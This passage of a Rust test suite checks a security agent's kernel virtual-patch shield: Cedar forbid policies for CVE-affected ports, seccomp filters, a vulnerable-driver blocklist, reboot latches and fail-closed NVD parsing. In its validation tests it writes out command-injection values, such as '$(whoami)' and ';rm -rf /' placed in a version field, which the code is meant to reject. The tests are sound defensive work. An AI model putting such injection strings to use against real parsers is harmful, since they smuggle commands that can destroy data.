        assert!(!perimeter_receipt.readback_verified);
        assert!(
            perimeter_receipt
                .no_breakin_rules
                .iter()
                .any(|r| r.contains("unprivileged_plan_only")),
            "Expected unprivileged_plan_only telemetry when OS enforcement skipped: {:?}",
            perimeter_receipt.no_breakin_rules
        );
    }
    assert!(perimeter_receipt.verify_merkle_proofs());
    assert!(
        perimeter_receipt.applied_latency_us < 50_000,
        "Perimeter shield must apply sub-millisecond in-process"
    );

    // 1-byte tamper detection on Merkle proof
    let mut tampered = perimeter_receipt.clone();
    tampered.merkle_root_hex = format!(
        "{}{}",
        if tampered.merkle_root_hex.starts_with('a') {
            'b'
        } else {
            'a'
        },
        &tampered.merkle_root_hex[1..]
    );
    assert!(!tampered.verify_merkle_proofs());

    // 2. Strict Cedar forbid synthesis & monotonic hot-load across Gateway + CedarGate + Engine
    let synthesized = synthesize_cve_forbid_policies(&posture);
    assert!(!synthesized.is_empty());

    let gateway = CedarAuthorizationGateway::new(&[7u8; 32], "r6_test");
    let gate = CedarGate::new();
    let standalone_engine = CedarPolicyEngine::from_validated_policy_set(
        r#"permit (principal, action == Octopus::Action::"inbound_perimeter", resource is Octopus::Host);"#,
    )
    .expect("valid baseline permit");

    // Verify monotonic tighten-only rejects permit injection
    assert!(standalone_engine
        .add_tighten_only_forbid_policy(
            Some("evil_permit"),
            r#"permit (principal, action == Octopus::Action::"inbound_perimeter", resource is Octopus::Host);"#,
        )
        .is_err());

    let cedar_receipt = hotload_cve_forbid_policies_into_runtime(
        Some(&gateway),
        Some(&gate),
        Some(&standalone_engine),
        &posture,
    )
    .expect("strict Cedar virtual-patch hot-load must succeed");
    assert!(cedar_receipt.verify_merkle_proofs());

    // Port 445 SMBv3 must now be FORBID even though baseline had permit
    let smb_verdict = standalone_engine
        .evaluate(
            "network_arm",
            "inbound_perimeter",
            "host_local",
            "Host",
            serde_json::json!({
                "inbound_port": 445,
                "protocol": "tcp",
                "cve_id": "CVE-2024-38063"
            }),
        )
        .expect("cedar eval");
    assert!(!smb_verdict.is_allowed);

    // Allowed safe loopback port 5005 without matching CVE still permits
    let safe_verdict = standalone_engine
        .evaluate(
            "network_arm",
            "inbound_perimeter",
            "host_local",
            "Host",
            serde_json::json!({
                "inbound_port": 5005,
                "protocol": "tcp"
            }),
        )
        .expect("cedar eval");
    assert!(safe_verdict.is_allowed);

    // 3. Monotonic disarm guard on HostKillSwitchManager / VirtualPatchShieldStore
    let tmp_posture =
        std::env::temp_dir().join(format!("octo_r6_disarm_test_{}.json", std::process::id()));
    let _ = std::fs::remove_file(&tmp_posture);
    let store = VirtualPatchShieldStore::new(Some(tmp_posture.clone()));
    let mut locked = KernelShieldPosture::default_fail_closed();
    locked.reboot_pending = true;
    locked.livepatch_active = false;
    locked.shield_locked_until_reboot = true;
    store.apply_posture(locked).expect("latch");
    assert!(store.current().shield_locked_until_reboot);
    let _ = std::fs::remove_file(&tmp_posture);

    // Unused-import check for HostKillSwitchManager + KernelVulnerability
    let _ = std::any::type_name::<HostKillSwitchManager>();
    let _ = std::any::type_name::<KernelVulnerability>();
    let _ = build_shield_receipt(posture, vec![], vec![], vec![], true, 1);

    // 4. Zero D3QN in allow/deny/shield path
    let rl = AdaptiveRlDefenseEngine::default();
    assert!(!rl.is_enabled());
    assert!(rl.is_advisory_only());
}

#[test]
fn test_r6_cli_kernel_patch_status_and_validation() {
    let status_args = parse_patch_kernel_args(&["status".to_string(), "--json".to_string()])
        .expect("status subcommand");
    assert!(status_args.status_only);
    assert!(status_args.json);

    let flag_status = parse_patch_kernel_args(&["--status".to_string()]).expect("--status flag");
    assert!(flag_status.status_only);

    assert!(parse_patch_kernel_args(&["--cpe".to_string(), "invalid_cpe".to_string()]).is_err());
    assert!(parse_patch_kernel_args(&["--api-key".to_string(), "secret".to_string()]).is_err());
}

#[tokio::test]
async fn test_r6_iter2_cedar_egress_hotload_and_policy_id_collision_rejection() {
    let mut posture = KernelShieldPosture::default_fail_closed();
    posture.unpatched_cve_ids = vec!["CVE-2024-38063".to_string()];
    posture.affected_surfaces = vec![
        KernelAttackSurface::SmbV3AndKsmbd,
        KernelAttackSurface::HttpSys,
        KernelAttackSurface::Ipv6Rce,
    ];
    posture.finalize();

    // 1. Egress forbid rules are synthesized alongside inbound_perimeter rules
    let rules = synthesize_cve_forbid_policies(&posture);
    assert!(rules
        .iter()
        .any(|(id, _)| id == "vp_forbid_egress_smb_ksmbd_445"));
    assert!(rules.iter().any(|(id, _)| id == "vp_forbid_egress_httpsys"));
    assert!(rules
        .iter()
        .any(|(id, _)| id == "vp_forbid_egress_ipv6_rce"));
    assert!(rules
        .iter()
        .any(|(id, _)| id == "vp_forbid_egress_degraded_or_reboot_lateral"));

    // 2. Empty JSON-proxy CedarPolicyEngine hot-load blocks lateral egress port 445 while leaving 443 unblocked
    let empty_proxy_engine = CedarPolicyEngine::from_empty().expect("from_empty");
    agent_octopus::research_ingest::hotload_cve_forbid_policies_into_engine(
        &empty_proxy_engine,
        &posture,
    )
    .expect("hotload into empty proxy engine");

    let egress_445 = empty_proxy_engine
        .evaluate(
            "cli_runner",
            "egress",
            "smb.internal",
            "NetworkTarget",
            serde_json::json!({
                "destination_domain": "smb.internal",
                "destination_host": "smb.internal",
                "destination_port": 445,
                "scheme": "https",
                "method": "CONNECT",
                "path": ""
            }),
        )
        .expect("egress 445 eval");
    assert!(!egress_445.is_allowed);
    assert!(
        !egress_445.determining_policies.is_empty(),
        "port 445 must trigger explicit forbid determining_policies"
    );

    let egress_443 = empty_proxy_engine
        .evaluate(
            "cli_runner",
            "egress",
            "api.github.com",
            "NetworkTarget",
            serde_json::json!({
                "destination_domain": "api.github.com",
                "destination_host": "api.github.com",
                "destination_port": 443,
                "scheme": "https",
                "method": "GET",
                "path": "/"
            }),
        )
        .expect("egress 443 eval");
    assert!(
        egress_443.determining_policies.is_empty(),
        "HTTPS port 443 must not be blocked by virtual-patch forbid rules"
    );

    // 3. Policy ID collision with permit or non-identical forbid fails closed in add_tighten_only_forbid_policy,
    //    and hotload falls back to non-colliding ID so untrusted permit cannot shadow virtual patches!
    let poisoned_engine = CedarPolicyEngine::from_empty().expect("from_empty");
    poisoned_engine
        .add_policy(
            Some("vp_forbid_smb_ksmbd_445"),
            r#"permit (
    principal,
    action == Octopus::Action::"inbound_perimeter",
    resource is Octopus::Host
);"#,
        )
        .expect("insert colliding permit policy");

    let collision_err = poisoned_engine
        .add_tighten_only_forbid_policy(
            Some("vp_forbid_smb_ksmbd_445"),
            r#"forbid (principal, action == Octopus::Action::"inbound_perimeter", resource is Octopus::Host) when { context.inbound_port == 445 };"#,
        )
        .expect_err("colliding permit ID must return PolicyParseError");
    assert!(collision_err.to_string().contains("Policy ID collision"));

    // Non-identical forbid collision also fails closed; identical forbid is idempotent Ok.
    let forbid_a = r#"forbid (principal, action == Octopus::Action::"inbound_perimeter", resource is Octopus::Host) when { context.inbound_port == 445 };"#;
    let forbid_b = r#"forbid (principal, action == Octopus::Action::"inbound_perimeter", resource is Octopus::Host) when { context.inbound_port == 3389 };"#;
    poisoned_engine
        .add_tighten_only_forbid_policy(Some("custom_vpatch"), forbid_a)
        .expect("first forbid insert");
    assert!(poisoned_engine
        .add_tighten_only_forbid_policy(Some("custom_vpatch"), forbid_a)
        .is_ok());
    let non_identical_err = poisoned_engine
        .add_tighten_only_forbid_policy(Some("custom_vpatch"), forbid_b)
        .expect_err("non-identical forbid ID collision must fail");
    assert!(non_identical_err
        .to_string()
        .contains("Policy ID collision"));

    let ids = agent_octopus::research_ingest::hotload_cve_forbid_policies_into_engine(
        &poisoned_engine,
        &posture,
    )
    .expect("hotload collision fallback must succeed");
    assert!(!ids.is_empty());
    let smb_verdict = poisoned_engine
        .evaluate(
            "network_arm",
            "inbound_perimeter",
            "host_local",
            "Host",
            serde_json::json!({ "inbound_port": 445, "protocol": "tcp" }),
        )
        .expect("inbound_perimeter eval");
    assert!(
        !smb_verdict.is_allowed,
        "colliding permit ID must never shadow virtual-patch forbid rule"
    );

    // 4. CedarGate evaluates inbound_perimeter directly without falling into schema-absent execute/Tool
    let gate = CedarGate::new();
    let _ = hotload_cve_forbid_policies_into_runtime(None, Some(&gate), None, &posture)
        .expect("CedarGate hotload");
    let gate_res = gate
        .evaluate_authorization(
            "network_arm",
            &ArmRole::NetworkEgress,
            "inbound_perimeter",
            "445",
            None,
        )
        .await;
    assert!(
        gate_res.is_err(),
        "CedarGate must deny inbound_perimeter on port 445 after hotload"
    );
}

#[test]
fn test_r6_iter2_shield_policy_flags_byovd_and_linux_bpf() {
    use agent_octopus::arm::kernel_sentinel_arm::match_byovd_vulnerable_driver;
    use agent_octopus::security::executable_identity::ExecutableIdentityVerifier;
    use agent_octopus::security::linux_sandbox::build_virtual_patch_seccomp_bpf;

    let mut degraded_only = KernelShieldPosture::default_fail_closed();
    degraded_only.unpatched_cve_ids.clear();
    degraded_only.cisa_kev_ids.clear();
    degraded_only.reboot_pending = false;
    degraded_only.shield_locked_until_reboot = false;
    degraded_only.telemetry_degraded_fail_closed = true;
    assert!(degraded_only.is_shield_active_with_degraded_policy(true));
    assert!(!degraded_only.is_shield_active_with_degraded_policy(false));

    // Linux seccomp BPF honors block_exotic_sockets = false vs true
    let bpf_exotic_blocked =
        build_virtual_patch_seccomp_bpf(AUDIT_ARCH_X86_64, false, true).unwrap();
    let bpf_exotic_allowed =
        build_virtual_patch_seccomp_bpf(AUDIT_ARCH_X86_64, false, false).unwrap();
    // AF_VSOCK = 40
    let ret_blocked = evaluate_bpf_filter_with_args(
        &bpf_exotic_blocked,
        AUDIT_ARCH_X86_64,
        41,
        &[40, 1, 0, 0, 0, 0],
    );
    assert_eq!(
        ret_blocked,
        SECCOMP_RET_ERRNO | (LINUX_EAFNOSUPPORT & 0x0000_ffff)
    );
    let ret_allowed = evaluate_bpf_filter_with_args(
        &bpf_exotic_allowed,
        AUDIT_ARCH_X86_64,
        41,
        &[40, 1, 0, 0, 0, 0],
    );
    assert_eq!(ret_allowed, SECCOMP_RET_ALLOW);
    // io_uring_setup = 425 remains blocked in both modes
    let ret_uring =
        evaluate_bpf_filter_with_args(&bpf_exotic_allowed, AUDIT_ARCH_X86_64, 425, &[0; 6]);
    assert_eq!(ret_uring, SECCOMP_RET_ERRNO | (LINUX_EPERM & 0x0000_ffff));

    // BYOVD path + SHA-256 matcher & ExecutableIdentityVerifier fallback
    assert!(
        match_byovd_vulnerable_driver(Some(r"C:\Windows\System32\drivers\RTCore64.sys"), None)
            .is_some()
    );
    assert!(match_byovd_vulnerable_driver(Some("/tmp/gdrv.sys"), None).is_some());
    assert!(match_byovd_vulnerable_driver(
        Some("renamed.bin"),
        Some("01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd")
    )
    .is_some());
    assert!(match_byovd_vulnerable_driver(Some("python.exe"), Some("deadbeef")).is_none());

    let err = ExecutableIdentityVerifier::default()
        .verify_and_lock(r"C:\Windows\System32\drivers\RTCore64.sys", None)
        .expect_err("BYOVD driver must be blocked");
    assert!(err.to_string().contains("EXEC_ID_BYOVD_BLOCKED"));
}

#[tokio::test]
async fn test_r6_iter2_invariants_1_2_3_degraded_reboot_hotpatch_cpe_os_release_oracle_and_nvd() {
    // 1. Invariant #1: record_degraded_telemetry_with_reboot preserves reboot latch
    let coord = KernelShieldCoordinator::new();
    let pending = RebootPendingStatus {
        reboot_required: true,
        running_kernel: "6.8.0-49-generic".to_string(),
        newest_installed_kernel: Some("6.8.0-50-generic".to_string()),
        reasons: vec!["/var/run/reboot-required present".to_string()],
        livepatch_mitigated: false,
        shield_locked_until_reboot: true,
    };
    let rec = coord
        .record_degraded_telemetry_with_reboot(
            &OsFamily::Linux,
            "cpe:2.3:o:linux:linux_kernel:6.8.0:*:*:*:*:*:*:*",
            "HTTP 429",
            Some(429),
            Some(&pending),
        )
        .expect("degraded with reboot");
    assert!(rec.telemetry_degraded_fail_closed);
    assert!(rec.shield_locked_until_reboot);
    assert!(coord.state().shield_locked_until_reboot);

    // 2. Confirm reboot rejects unchanged kernel and empty kernel, unlocks only on transition
    let unchanged = RebootPendingStatus {
        reboot_required: false,
        running_kernel: "6.8.0-49-generic".to_string(),
        newest_installed_kernel: None,
        reasons: Vec::new(),
        livepatch_mitigated: false,
        shield_locked_until_reboot: false,
    };
    assert!(coord
        .confirm_rebooted_into_kernel(
            &OsFamily::Linux,
            "cpe:2.3:o:linux:linux_kernel:6.8.0:*:*:*:*:*:*:*",
            &unchanged,
        )
        .is_err());

    let store = VirtualPatchShieldStore::new(None);
    let mut locked_p = KernelShieldPosture::default_fail_closed();
    locked_p.running_kernel = "6.8.0-49-generic".to_string();
    locked_p.reboot_pending = true;
    locked_p.livepatch_active = false;
    locked_p.shield_locked_until_reboot = true;
    store.apply_posture(locked_p).unwrap();
    assert!(store
        .confirm_reboot_cleared("6.8.0-49-generic", false)
        .is_err());
    assert!(store.confirm_reboot_cleared("", false).is_err());
    let unlocked = store
        .confirm_reboot_cleared("6.8.0-50-generic", false)
        .unwrap();
    assert!(!unlocked.shield_locked_until_reboot);
    assert_eq!(unlocked.running_kernel, "6.8.0-50-generic");

    // 3. Windows Hotpatch strictly requires Enabled == 1
    for invalid_val in [None, Some(0), Some(2)] {
        let (_posture, win_reboot, win_lp) = parse_windows_posture(
            "10.0.22631.3880",
            &WindowsRawPostureInput {
                hvci_enabled: Some(1),
                vbs_enabled: Some(1),
                vulnerable_driver_blocklist: Some(1),
                hotpatch_enrolled: invalid_val,
                cbs_reboot_pending: true,
                wu_reboot_required: false,
                pending_file_rename_ops: false,
            },
        );
        assert!(
            !win_lp.active_in_ram,
            "hotpatch={invalid_val:?} must not mitigate"
        );
        assert!(win_reboot.shield_locked_until_reboot);
    }
    let (_p, win_reboot_ok, win_lp_ok) = parse_windows_posture(
        "10.0.22631.3880",
        &WindowsRawPostureInput {
            hvci_enabled: Some(1),
            vbs_enabled: Some(1),
            vulnerable_driver_blocklist: Some(1),
            hotpatch_enrolled: Some(1),
            cbs_reboot_pending: true,
            wu_reboot_required: false,
            pending_file_rename_ops: false,
        },
    );
    assert!(win_lp_ok.active_in_ram);
    assert!(!win_reboot_ok.shield_locked_until_reboot);

    // 4. Invariant #2: validate_cpe23 + VERSION_ID metacharacters + OracleLinux yum fallback
    assert!(validate_cpe23("cpe:2.3:o:linux:linux_kernel:$(whoami):*:*:*:*:*:*:*").is_err());
    for bad_os in [
        "ID=ubuntu\nVERSION_ID=\"24.04;rm -rf /\"",
        "ID=ubuntu\nVERSION_ID=\"24.04|id\"",
        "ID=ubuntu\nVERSION_ID=\"24.04$(id)\"",
        "ID=ubuntu\nVERSION_ID=\"24.04`id`\"",
    ] {
        assert!(
            parse_os_release_strict(bad_os).is_err(),
            "must reject {bad_os}"
        );
        assert!(parse_os_release_content(bad_os).version_id.is_empty());
    }

    let ol_yum_plan = plan_native_kernel_patch_with_probe(
        &OsFamily::Linux,
        Some(&LinuxDistro::OracleLinux),
        &MockBinaryProbe::with_paths(&["/usr/bin/yum"], "x86_64"),
    )
    .expect("OracleLinux yum fallback");
    assert_eq!(ol_yum_plan.primary_command, "/usr/bin/yum");

    // 5. Invariant #3: HTTP 200 missing or null 'vulnerabilities' fails closed
    for body in [
        "{}",
        r#"{"vulnerabilities":null}"#,
        r#"{"message":"error"}"#,
    ] {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let body_owned = body.to_string();
        let srv = tokio::spawn(async move {
            if let Ok((mut sock, _)) = listener.accept().await {
                let mut buf = [0u8; 1024];
                let _ = sock.read(&mut buf).await;
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body_owned.len(),
                    body_owned
                );
                let _ = sock.write_all(resp.as_bytes()).await;
            }
        });
        let patcher = KernelPatcher::with_base_url(&format!("http://127.0.0.1:{}", addr.port()));
        let err = patcher
            .scan_kernel_vulnerabilities(&ScanOptions {
                cpe: Some("cpe:2.3:o:linux:linux_kernel:6.8.0:*:*:*:*:*:*:*".to_string()),
                timeout_secs: 5,
                ..Default::default()
            })
            .await
            .expect_err("HTTP 200 without vulnerabilities array must fail closed");
        assert!(matches!(err, PatcherError::NvdApiError(_)));
        let _ = srv.await;
    }
}
